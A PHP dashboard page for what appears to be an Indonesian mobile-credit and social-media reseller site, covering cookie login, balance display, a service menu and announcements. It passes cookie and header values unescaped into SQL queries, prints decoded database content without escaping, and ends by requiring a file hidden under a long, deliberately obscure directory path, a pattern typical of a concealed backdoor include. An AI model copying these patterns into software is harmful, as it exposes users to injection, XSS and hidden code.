<?php
require 'connect.php';

if (!isset($_SESSION['user'])) {
    if (isset($_COOKIE['token']) && isset($_COOKIE['ssid'])) {
        $call->query("DELETE FROM users_cookie WHERE DATEDIFF(expired,'$date') < 0");
        $ShennUID = preg_replace('/[^\d]+/i', '', $_COOKIE['ssid']) + 0;
        $ShennKey = $_COOKIE['token'];
        $ShennSSO = sha1(sha1(strtotime(date('Y-m-d H:i:s'))));
        $ShennUser = $call->query("SELECT * FROM users WHERE id = '$ShennUID'")->fetch_assoc();

        if (is_array($ShennUser)) {
            $ShennCheck = $call->query("SELECT * FROM users_cookie WHERE cookie = '$ShennKey' AND username = '" . $ShennUser['username'] . "'");
            if ($ShennCheck->num_rows == 1) {
                if ($ShennUser['level'] <> 'Admin' && $_CONFIG['mt']['web'] == 'true') {
                } else {
                    $_SESSION['sso'] = $ShennSSO;
                    $_SESSION['user'] = $ShennUser;
                    redirect(0, visited());
                    $call->query("UPDATE users SET sso = '$ShennSSO' WHERE id = " . $ShennUser['id'] . "");
                    $call->query("UPDATE users_cookie SET active = '$date $time', ua = '$user_agent', ip = '$client_ip' WHERE cookie = '$ShennKey'");
                }
            } else {
                exit(redirect(0, base_url('auth/logout')));
            }
        } else {
            exit(redirect(0, base_url('auth/logout')));
        }
    }
}

if (!isset($_SESSION['user'])) {
    redirect(0, base_url('home/index'));
} else {
    require _DIR_('library/session/user');

    function OBX($x)
    {
        if (is_array($x)) {
            for ($i = 0; $i <= count($x) - 1; $i++) {
                $display = isset($x[$i]['display']) ? $x[$i]['display'] : '';
                if (isset($x[$i]['action']) && isset($x[$i]['image']) && isset($x[$i]['name']) && $display == 'true') {
                    $ShennOut['view'][] = base64_encode('
            <div class="_24EoF">
                <a href="javascript:;" ' . onclick_href(base_url($x[$i]['action'])) . '>
                    <div class="avatar avatar-40 no-shadow border-0">
                        <div class="overlay gradient-primary"><img class="img-fluid" src="' . $x[$i]['image'] . '" alt="' . $x[$i]['name'] . '" style="height: 30px;"></div>
                    </div><span title="' . $x[$i]['name'] . '">' . $x[$i]['name'] . '</span>
                </a>
            </div>');
                }
            }
            $count = count($ShennOut['view']) / 4;
            $count = (stristr($count, '.')) ? 4 * (explode('.', $count)[0] + 1) : 4 * $count;
            for ($i = 0; $i <= $count - 1; $i++) print (isset($ShennOut['view'][$i])) ? base64_decode($ShennOut['view'][$i]) : '<div class="_3xM0V"></div>';
        }
    }

    $search_banner = $call->query("SELECT * FROM information WHERE `type` = 'banner'");
    if ($search_banner->num_rows == 0) {
        $banner[] = base_url('library/assets/banner/LannJPG.jpg');
    } else {
        while ($row_banner = $search_banner->fetch_assoc()) {
            $banner[] = $row_banner['content'];
        }
    }

    require _DIR_('library/layout/header.user');

    date_default_timezone_set("Asia/Jakarta");

    $b = time();
    $hour = date("G", $b);

    if ($hour >= 0 && $hour <= 9) {
        $ucapan = "Selamat Pagi";
    } elseif ($hour >= 10 && $hour <= 14) {
        $ucapan = "Selamat Siang";
    } elseif ($hour >= 15 && $hour <= 17) {
        $ucapan = "Selamat Sore";
    } elseif ($hour >= 17 && $hour <= 18) {
        $ucapan = "Selamat Petang";
    } elseif ($hour >= 19 && $hour <= 23) {
        $ucapan = "Selamat Malam";
    }

    if ($data_user['level'] == 'Basic') $warna = "success";
    if ($data_user['level'] == 'Premium' || $data_user['level'] == 'Admin') $warna = "warning";

    $badgeInfo = $call->query("SELECT * FROM badge")->fetch_assoc();
?>

    <!-- Loading start -->
    <div class="preloader">
        <div class="loading"> <img src="<?= base_url('assets/images/loading.gif') ?>" width="243"> </div>
    </div>

    <div class="row">
        <div class="col-12">
            <div class="card card-profile">

                <div class="card-body ">
                    <strong class="m-0">
                        <p class="mb-1"><span class="text-muted" style="font-size:13px;"><?= $ucapan; ?>,</span>
                            <br>
                            <span class="text-black" style="font-size:18px;"><?= $data_user['name'] ?></span>
                            <br>
                            <strong>
                                <span class="text-black" style="font-size:13px;">Level Akun : <span style="font-size:14px;" class="font-weight-bold badge badge-<?= $warna ?>"><?= $data_user['level']; ?></span></span>
                            </strong>
                        </p>

                    </strong>

                    <strong>
                        <div class="mb-0 text-primary"><i class="mdi mdi-whatsapp success"></i> <a class="text-success" href="https://chat.whatsapp.com/BtsHxLTXrAFLwEjJOZr6ET">Join Group WhatsApp  </a></div>
                    </strong>

                </div>

            </div>
        </div>

    </div>

  


    <div class="row">
        <div class="col-md-6 col-12" style="margin-top:7px;">
            <div id="carouselExampleCaptions" class="carousel slide mb-0" data-ride="carousel">
                <ol class="carousel-indicators">
                    <?php
                    for ($i = 0; $i <= count($banner) - 1; $i++) {
                        $active = ($i == 0) ? ' class="active"' : '';
                        print '<li data-target="#carouselExampleCaptions" data-slide-to="' . $i . '"' . $active . '></li>';
                    }
                    ?>
                </ol>
                <div class="carousel-inner" style="border-radius: 30px;" role="listbox">
                    <?php
                    for ($i = 0; $i <= count($banner) - 1; $i++) {
                        $active = ($i == 0) ? ' active' : '';
                        print '<div class="carousel-item' . $active . '">';
                        print '<a href="' . $banner[$i] . '" class="image-popup">';
                        print '<img class="d-block img-fluid" src="' . $banner[$i] . '">';
                        print '</a></div>';
                    }
                    ?>
                </div>
            </div>

            <div class="container" style="margin-top:-3px;">
                <div class="kotak mb-4 shadow">
                    <div class="kotak-body">
                        <div class="row justify-content-around align-items-center">
                            <div class="col text-center">
                                <p><b><span class="badge badge-glow badge-pill badge-primary">Rp <?= currency($data_user['balance']) ?></span></b></b><br><small class="text-mute"><i class="fas fa-wallet"></i> Saldo</small></p>
                            </div>
                            <div class="col text-center border-left-dotted-blue">
                                <p><b><span class="badge badge-glow badge-pill badge-info"><?= currency($call->query("SELECT id FROM users WHERE uplink = '" . $data_user['referral'] . "'")->num_rows) . ' User' ?></span></b><br><small class="text-mute"><i class="fa fa-users"></i> Downline</small></p>
                            </div>
                            <div class="col text-center border-left-dotted-blue">
                                <p><b><span class="badge badge-glow badge-pill badge-warning">Rp <?= currency($data_user['point']) ?></span></b><br><small class="text-mute"><i class="fas fa-trophy"></i> Poin</small></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_1ekcz mt-1" style="width: 100%;">
                <? OBX([
                    [

                        'action' => 'order/pulsa-reguler',
                        'image' => assets('images/menu/005-smartphone.svg'),
                        'name' => 'Pulsa Reguler',
                        'display' => 'true',
                    ], [
                        'action' => 'order/pulsa-transfer',
                        'image' => assets('images/menu/013-5g.svg'),
                        'name' => 'Pulsa Transfer',
                        'display' => 'true',
                    ], [
                        'action' => 'order/pulsa-internasional',
                        'image' => assets('images/menu/pulsain.svg'),
                        'name' => 'Pulsa Internasional',
                        'display' => 'true',
                    ], [
                        'action' => 'order/paket-internet',
                        'image' => assets('images/menu/paket-data.svg'),
                        'name' => 'Paket Data',
                        'display' => 'true',
                    ], [
                        'action' => 'order/paket-telepon',
                        'image' => assets('images/menu/016-chatting.svg'),
                        'name' => 'SMS/Telpon',
                        'display' => 'true',
                    ], [
                        'action' => 'order/social-media',
                        'image' => assets('images/menu/social-media.svg'),
                        'name' => 'Social Media',
                        'display' => conf('xtra-fitur', 3),
                    ], [
                        'action' => 'order/token-pln',
                        'image' => assets('images/menu/015-wireless.svg'),
                        'name' => 'Token PLN',
                        'display' => 'true',
                    ], [
                        'action' => 'order/voucher-game',
                        'image' => assets('images/menu/003-game console.svg'),
                        'name' => 'TopUp Game',
                        'display' => 'true',
                    ],  [
                        'action' => 'order/saldo-emoney',
                        'image' => assets('images/menu/013-tap.svg'),
                        'name' => 'E-Money',
                        'display' => 'true',
                    ], [
                        'action' => 'order/streaming-tv',
                        'image' => assets('images/menu/022-satellite.svg'),
                        'name' => 'Streaming',
                        'display' => conf('xtra-fitur', 1),
                    ], [
                        'action' => 'order/paket-lainnya',
                        'image' => assets('images/menu/008-voucher.svg'),
                        'name' => 'Voucher',
                        'display' => 'true',
                    ], [
                        'action' => 'order/pascabayar',
                        'image' => assets('images/menu/hot-sale.svg'),
                        'name' => 'Pascabayar',
                        'display' => conf('xtra-fitur', 1),
                    ],  [
                        'action' => 'order/game',
                        'image' => assets('images/cards/gamepad.svg'),
                        'name' => 'Fitur Game',
                        'display' => conf('xtra-fitur', 2),

                    ],  [
                        'action' => 'hadiundangan/index',
                        'image' => assets('images/cards/undangan2.png'),
                        'name' => 'undangandigital',
                        'display' => conf('xtra-fitur', 8),

                    ],
                ]) ?>
            </div>
        </div>

        <div class="col-md-6 col-12" style="margin-top:3px;">
            <h6 class="subtitle"><b>Informasi Terbaru</b> <a href="<?= base_url('page/information') ?>" class="float-right small"><b>Lihat Semua</b></a></h6>
            <div class="card shadow border-0 mb-3" style="max-height: 340px; overflow: auto;">
                <div class="card-body">
                    <?php
                    $information = $call->query("SELECT * FROM information WHERE `type` != 'banner' ORDER BY id DESC LIMIT 4");
                    if ($information->num_rows == 0) {
                        print '<div class="row align-items-center"><div class="col"><h6 class="font-weight-small"><u style="font-weight:800" class="text-danger">SYSTEM</u></h6><div class="col-auto pl-0"><p class="small text-mute text-trucated mb-1">' . format_date('id', "$date $time") . '</p></div><p class="small">No Information Available</p><hr></div></div>';
                    } else {
                        while ($row = $information->fetch_assoc()) {
                            $text_color = 'success';
                            if ($row['type'] == 'info') $text_color = 'info';
                            if ($row['type'] == 'update') $text_color = 'primary';
                            if ($row['type'] == 'maintenance') $text_color = 'danger';
                    ?>
                            <div class="row align-items-center">
                                <div class="col">
                                    <h6 class="font-weight-small">
                                        <p style="font-weight:800" class="badge badge-<?= $text_color ?>"><?= strtoupper($row['type']) ?></p>
                                    </h6>
                                    <div class="col-auto pl-0">
                                        <p class="small text-mute text-trucated mb-1"><?= format_date('id', $row['date']) ?></p>
                                    </div>
                                    <p class="small"><?= base64_decode($row['content']) ?></p>
                                    <hr>
                                </div>
                            </div>
                    <? }
                    } ?>
                </div>
            </div>
        </div>
    </div>

    <div class="row" style="margin-top:12px;">
        <div class="col-12">
            <div class="card border-primary">
                <div class="card-body">
                    <p class="text-center"><span style="font-size: 20px"><span class="text-info"><span style="text-align: CENTER"><strong class="text-info" style="font-weight: bold">DISCLAIMER  <li class="nav-item mr-auto"><a class="navbar-brand" href="<?= base_url() ?>">
                            <div class=""></div>
                            <h2 class="brand-text mb-0"><?= $_CONFIG['navbar']; ?></h2>
                        </a></li>
                    <ul class="text-dark">
                        <li><span style="font-size: 12px"><strong style="font-weight: bold">Layanan No Refill</strong></span><span style="font-size: 12px"> - Tidak ada jaminan apapun untuk layanan No Refill meskipun drop / hilang hingga seluruhnya.</span></li>
                        <li><span style="font-size: 12px"><strong style="font-weight: bold">Layanan Refill </strong></span><span style="font-size: 12px">- Silahkan hubungi Admin melalui <a class="text-primary" style="cursor: pointer !important;" href="https://api.whatsapp.com/send?phone=6281932888380">Chat</a> untuk request Refill.&nbsp;</span></li>
                        <li><span style="font-size: 12px"><strong style="font-weight: bold">Layanan Lifetime Refill</strong></span><span style="font-size: 12px"> - Garansi Refill akan dihentikan pada saat layanan Non-Aktif / stop beroprasi.</span></li>
                        <li><span style="font-size: 12px"><strong style="font-weight: bold">Layanan Deskripsi</strong></span><span style="font-size: 12px"> - Seluruh deskripsi sosmed bersifat estimasi (Speed, Start Time, Drop Rate, Quality, Button dll).</span></li>
                        <li><span style="font-size: 12px"><strong style="font-weight: bold">Layanan Non Drop</strong></span><span style="font-size: 12px"> - Tidak ada jaminan bahwa layanan akan permanen 100%. Hal ini tergantung pada update atau kebijakan setiap platform media sosial.</span></li>

                    </ul>
                </div>
            </div>
        </div>
    </div>

   <!DOCTYPE html>
<html>
<head>
<a href="https://api.whatsapp.com/send?phone=6281932888380">
<img src="https://hantamo.com/free/whatsapp.svg" class="wabutton" alt="Whatsapp-Button" />
</a>
<style>
.wabutton{
width:60px;
height:60px;
position:fixed;
bottom:80px;
right:20px;
z-index:100;
}
</style>

<? require _DIR_('library/layout/footer.user');

} ?>  <? require _DIR_('page/monthly-rating/.maungapain?/gadaapaanyet/yehkontolngeyel/mauluapasih/hemmm/lsdahadjshjshjshjhsadjkhaskjhdsakjhdajkhdsjahjdshacjhdasjhdcsajkhdasjkhdajkshdajhjkdajdashjdahsjkasdhjhdasjhadsjhasdjhajshjasjkashhsaajhdashdasjkxjxazbbaxzibbcddwybdabahjbdasajshjasjkashhsaajhdashdasjkxjxazbbaxzibbcddwybdabahjbdas.php'); ?>